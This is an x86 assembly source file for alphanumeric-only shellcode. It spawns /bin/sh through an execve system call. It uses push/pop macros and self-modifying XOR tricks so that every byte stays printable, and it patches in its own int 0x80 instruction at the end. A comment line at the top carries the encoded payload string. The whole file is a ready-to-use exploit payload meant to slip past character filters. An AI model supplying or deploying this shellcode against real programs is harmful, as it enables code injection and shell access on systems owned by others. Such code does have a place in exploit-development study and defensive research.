# /* LLLLYhzeroX5zeroPZRh//shh/binTXRRRPRRQRaH5A0AA1F7QX4J4AsO */ #
.macro pmovl arg1, arg2
	pushl \arg1
	popl \arg2
.endm

.macro movl_eip reg
.rept	4
	decl %esp
.endr
	popl \reg
.endm

.macro clear_eax
	pmovl $0x6f72657a, %eax
	xorl $0x6f72657a, %eax
.endm

.text
.globl _start
_start:
	movl_eip %ecx

	clear_eax

	pmovl %eax, %edx

	pushl %edx
	pushl $0x68732f2f
	pushl $0x6e69622f

	pmovl %esp, %eax

.rept	3
	pushl %edx
.endr
	pushl %eax
.rept	2
	pushl %edx
.endr
	pushl %ecx
	pushl %edx
	popa

	decl %eax
	xorl $0x41413041, %eax
	xorl %eax, 0x37(%esi)

	pmovl %ecx, %eax
	xorb $0x4a, %al
	xorb $0x41, %al

	.byte 0x73, 0x4f 	# int $0x80

